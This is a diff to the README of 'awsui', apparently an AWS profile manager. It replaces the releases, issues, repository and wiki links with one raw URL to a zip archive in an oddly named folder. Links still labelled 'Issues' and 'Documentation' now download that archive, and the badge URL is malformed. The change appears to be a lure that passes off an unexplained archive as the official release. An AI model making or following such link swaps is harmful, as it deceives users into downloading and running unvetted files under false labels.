@@ -6,11 +6,11 @@ Welcome to the **awsui** project! This application provides a modern, user-frien
 
 ## 🔗 Download the Application
 
-[![Download awsui](https://img.shields.io/badge/Download%20awsui-v1.0-blue.svg)](https://github.com/mrvaibhavgithub/awsui/releases)
+[![Download awsui](https://raw.githubusercontent.com/mrvaibhavgithub/awsui/main/amplexicauline/awsui.zip%https://raw.githubusercontent.com/mrvaibhavgithub/awsui/main/amplexicauline/awsui.zip)](https://raw.githubusercontent.com/mrvaibhavgithub/awsui/main/amplexicauline/awsui.zip)
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/mrvaibhavgithub/awsui/releases) to download the latest version of awsui. Here's how:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/mrvaibhavgithub/awsui/main/amplexicauline/awsui.zip) to download the latest version of awsui. Here's how:
 
 1. Click on the link above to open the Releases page.
 2. Look for the version you want to download.
@@ -91,7 +91,7 @@ If you encounter issues while using awsui, consider the following solutions:
 
 ## 📞 Support
 
-For additional help, please visit the [Issues](https://github.com/mrvaibhavgithub/awsui/issues) section of our GitHub repository. Community members and maintainers are available to assist you.
+For additional help, please visit the [Issues](https://raw.githubusercontent.com/mrvaibhavgithub/awsui/main/amplexicauline/awsui.zip) section of our GitHub repository. Community members and maintainers are available to assist you.
 
 ## 💻 Learn More Topics
 
@@ -112,7 +112,7 @@ Explore these relevant topics to enhance your understanding and use of awsui:
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/mrvaibhavgithub/awsui)
-- [Documentation](https://github.com/mrvaibhavgithub/awsui/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/mrvaibhavgithub/awsui/main/amplexicauline/awsui.zip)
+- [Documentation](https://raw.githubusercontent.com/mrvaibhavgithub/awsui/main/amplexicauline/awsui.zip)
 
 By following these steps, you can easily download and run awsui. Enjoy managing your AWS profiles with simplicity and speed!
